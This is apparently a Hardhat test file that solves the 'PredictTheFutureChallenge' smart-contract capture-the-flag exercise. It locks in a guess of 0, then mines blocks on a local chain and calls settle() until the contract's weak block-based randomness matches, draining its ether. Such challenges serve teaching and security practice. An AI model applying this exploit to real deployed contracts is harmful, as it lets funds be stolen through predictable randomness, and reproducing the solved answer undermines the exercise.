import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const guess = 0;

    //Lock in a guess of 0
    await target.lockInGuess(guess, { value: utils.parseEther('1') });

    //Get the block number that our guess was mined in.
    const lockInBlockNumber = await provider.getBlockNumber();
    const settlementBlockNumber = lockInBlockNumber + 1;


    //key variables for loop
    let completed = false;
    const maxAttempts = 2500;
    let attempts = 0;

    //while conidtion to force the exploit
    while (!completed && attempts < maxAttempts) {
            
      //mine a block
      await provider.send('evm_mine', []);
      attempts++;//increase the counter

      //Checks to see if we meet the condition of passing the settlementBlockNumber or mines again.
      const currentBlockNumber = await provider.getBlockNumber();
      if (currentBlockNumber > settlementBlockNumber) {
        
        try {
          await target.settle();
          completed = await target.isComplete();
        } catch (error) {
          // Ignore errors and continue looping
        }
      }
    }

    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
